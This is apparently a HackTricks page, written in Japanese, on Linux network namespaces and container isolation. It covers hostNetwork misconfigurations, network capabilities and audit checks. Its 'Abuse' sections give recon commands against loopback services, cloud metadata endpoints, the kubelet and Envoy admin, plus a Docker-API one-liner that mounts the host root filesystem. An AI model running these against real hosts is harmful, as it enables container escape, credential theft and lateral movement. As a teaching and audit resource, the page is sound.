# ネットワーク namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## 概要

network namespace は、インターフェース、IP アドレス、routing tables、ARP/neighbor state、firewall rules、sockets、UNIX-domain abstract socket namespace、`/proc/net` のようなファイルの内容など、ネットワーク関連のリソースを分離します。<sup>[[2]](#references)</sup> これにより、container は、host の実際の network stack を所有していなくても、自身の `eth0`、ローカル routes、loopback device を持っているように見せることができます。

Security の観点では、これは network isolation が単なる port binding をはるかに超えるものであるため重要です。private network namespace によって、workload が直接観察または再構成できる対象を制限できます。その namespace が host と共有されると、container は突然、host listeners、host-local services、abstract AF_UNIX endpoints、そして本来 application に公開されるはずのなかった network control points を可視化できるようになります。

## 動作

新しく作成された network namespace は、インターフェースが接続されるまで、空またはほぼ空の network environment で開始します。その後、container runtimes は virtual interfaces を作成または接続し、addresses を割り当て、workload が想定どおり接続できるよう routes を設定します。bridge-based deployments では通常、container には host bridge に接続された veth-backed interface が見えます。Kubernetes では、CNI plugins が Pod networking に相当する設定を処理します。

この architecture により、`--network=host` または `hostNetwork: true` が非常に大きな変更である理由がわかります。準備された private network stack を受け取る代わりに、workload は host の実際のものに参加します。

## Lab

次のコマンドで、ほぼ空の network namespace を確認できます。
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
また、通常のコンテナと host-networked コンテナは、次のように比較できます:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
host-networked container は、独自に分離された socket と interface の view を持たなくなります。process がどの capabilities を持っているかを確認する前でも、この変更だけですでに重大です。

## Runtime Usage

Docker と Podman は、別途設定されていない限り、通常は各 container 用に private network namespace を作成します。Kubernetes は通常、各 Pod に独自の network namespace を割り当てます。この namespace はその Pod 内の container 間で共有されますが、host からは分離されています。つまり、`127.0.0.1` は通常 container-local ではなく Pod-local です。ある container で localhost のみに bind された listener は、通常、その sidecar や sibling から到達可能です。Incus/LXC systems も、network namespace を基盤とした強力な isolation を提供しており、多様な virtual networking 構成に対応しています。

共通する原則は、private networking がデフォルトの isolation boundary であり、host networking はその boundary から明示的に opt-out する設定だということです。

## Misconfigurations

最も重要な misconfiguration は、単純に host network namespace を共有することです。これは performance、low-level monitoring、または利便性のために行われることがありますが、container で利用できる最も明確な boundary の1つを取り除きます。Host-local listener により直接到達できるようになり、localhost-only service にアクセスできる場合があります。また、`CAP_NET_ADMIN` や `CAP_NET_RAW` などの capabilities は、それらによって有効になる操作が host 自身の network environment に適用されるため、はるかに危険になります。

もう1つの問題は、network namespace が private であっても、network 関連の capabilities を過剰に付与することです。private namespace は確かに役立ちますが、raw socket や高度な network control を無害にするわけではありません。

Kubernetes では、`hostNetwork: true` によって、Pod-level network segmentation をどの程度信頼できるかも変わります。Kubernetes のドキュメントでは、多くの network plugin が `podSelector` / `namespaceSelector` matching において `hostNetwork` Pod の traffic を適切に区別できず、そのため通常の node traffic として扱うと説明されています。<sup>[[1]](#references)</sup> attacker の観点では、これは compromised `hostNetwork` workload を、overlay-network workload と同じ policy assumptions によって制限される通常の Pod ではなく、node-level network foothold として扱うべき場合が多いことを意味します。

## Abuse

isolation が弱い setup では、attacker は host の listening service を inspect したり、loopback のみに bind された management endpoint に到達したり、正確な capabilities と environment に応じて traffic を sniff または interfere したり、`CAP_NET_ADMIN` が存在する場合には routing や firewall state を reconfigure したりできます。cluster 内では、これによって lateral movement や control-plane reconnaissance も容易になる可能性があります。

host networking が疑われる場合は、まず表示される interface と listener が isolated container network ではなく host に属していることを確認します。
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Loopback 専用サービスは、最初に見つかる興味深い対象であることが多い：
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Abstract UNIX ソケットは、TCP/UDP リスナーのようには見えず、`/run` 配下の filesystem path として存在しない場合もあるため、見落としやすい別の対象です。したがって、host-networked container は、コンテナに bind-mount されていない host 専用の control channel へのアクセスを継承する可能性があります:
```bash
ss -xap 2>/dev/null | head -n 50
grep -a '@' /proc/net/unix 2>/dev/null | head -n 50
```
歴史的な例としては、`containerd-shim` の abstract-socket exposure bug がありました。しかし、具体的な CVE よりも重要な教訓があります。workload が host network namespace に参加すると、abstract AF_UNIX services も攻撃対象領域の一部になるということです。<sup>[[3]](#references)</sup> それらの socket が runtime 関連または管理用に見える場合は、[Runtime API And Daemon Exposure](../../runtime-api-and-daemon-exposure.md) に移行してください。

network capabilities が存在する場合は、workload が可視状態の stack を検査または変更できるかテストします：
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
現代のkernelでは、host networking と `CAP_NET_ADMIN` により、単純な `iptables` / `nftables` の変更を超えて packet path が公開される可能性もあります。`tc` の qdiscs と filters も namespace-scoped であるため、共有された host network namespace 内では、container が認識できる host interfaces に適用されます。さらに `CAP_BPF` が存在する場合、TC や XDP loaders などの network-related eBPF programs も重要になります。<sup>[[4]](#references)</sup>
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
これは、攻撃者が firewall rules を書き換えるだけでなく、host interface レベルで traffic を mirror、redirect、shape、または drop できる可能性があるため重要です。private network namespace 内では、これらの操作は container の view 内に限定されますが、shared host namespace では host に影響を及ぼす操作になります。

cluster や cloud 環境では、host networking によって metadata や control-plane に隣接する services の迅速な local recon も正当化されます：
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
Kubernetesでは、複数のcontainerを含むPodでは**いずれか**のcontainerをcompromiseすると、sibling containerやsidecarが開いているlocalhost listenerにもアクセスできることを覚えておいてください。これは、service-mesh、observability、helper containerなどのadminまたはdebug interfaceが、cluster全体ではなく意図的にPod内部だけで利用可能になっている場合に、特に重要になります。
```bash
ss -lntup | grep -E '127.0.0.1|::1'
curl -s http://127.0.0.1:15000/server_info 2>/dev/null | head
curl -s http://127.0.0.1:15000/config_dump 2>/dev/null | head
```
「localhost に bind されている」を **Pod-private** であり、**container-private** ではないと考えてください。Pod 内のいずれかの container が compromise された後は、その前提は成立しません。

### 完全な例: Host Networking + Local Runtime / Kubelet Access

Host networking は自動的に host root を提供するわけではありませんが、node 自体からのみ意図的に到達可能な service を公開することがよくあります。そのような service の保護が不十分な場合、Host networking は直接的な privilege-escalation path になります。

localhost 上の Docker API:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
localhost 上の Kubelet:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
影響：

- 適切な保護なしでローカル runtime API が公開されている場合、ホストを直接 compromise される可能性
- kubelet またはローカル agent に到達可能な場合、cluster reconnaissance や lateral movement を受ける可能性
- `CAP_NET_ADMIN` と組み合わせた場合、traffic manipulation や denial of service が可能

## Checks

これらの checks の目的は、process が private network stack を持っているか、どの routes と listeners が見えているか、さらに capabilities をテストする前の段階で network view がすでに host-like に見えるかを確認することです。
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
ss -xap                      # UNIX sockets, including abstract namespace entries
grep -a '@' /proc/net/unix   # Quick view of abstract AF_UNIX sockets in this netns
```
ここで注目すべき点:

- `/proc/self/ns/net` と `/proc/1/ns/net` がすでに host-like に見える場合、container が host の network namespace、または別の non-private namespace を共有している可能性があります。
- `lsns -t net` と `ip netns identify` は、shell がすでに名前付きまたは永続的な namespace 内にあり、host 側の `/run/netns` オブジェクトとの対応を確認したい場合に有用です。
- `ss -lntup` は、loopback-only listener やローカルの management endpoint を明らかにするため、特に有用です。`ss -xap` と `/proc/net/unix` を使うと、通常の filesystem socket の探索では見落とす abstract-socket の情報も確認できます。
- `CAP_NET_ADMIN`、`CAP_NET_RAW`、または `CAP_BPF` が存在する場合、route、interface name、firewall context、`tc` state、eBPF attachment はさらに重要になります。
- Kubernetes では、`hostNetwork` Pod で service-name resolution に失敗しても、service が存在しないとは限りません。単に Pod が `dnsPolicy: ClusterFirstWithHostNet` を使用していないだけの可能性があります。
- 複数の container で構成された Pod では、localhost listener は Pod 全体の network namespace に属します。そのため、loopback-only port が侵害された container から到達不能だと判断する前に、sidecar と sibling container を確認してください。

container をレビューする際は、常に network namespace を capability set と併せて評価してください。Host networking と強力な network capability の組み合わせは、bridge networking と限定的な default capability set の組み合わせとは、security posture が大きく異なります。

## 参考資料

- [1] [Kubernetes NetworkPolicy と `hostNetwork` に関する注意点](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [2] [Linux の `network_namespaces(7)` と abstract UNIX socket の isolation](https://man7.org/linux/man-pages/man7/network_namespaces.7.html)
- [3] [containerd advisory: host-network container に公開される abstract Unix domain socket](https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4)
- [4] [network-related eBPF program に必要な eBPF token と capability](https://docs.ebpf.io/linux/concepts/token/)

{{#include ../../../../../banners/hacktricks-training.md}}
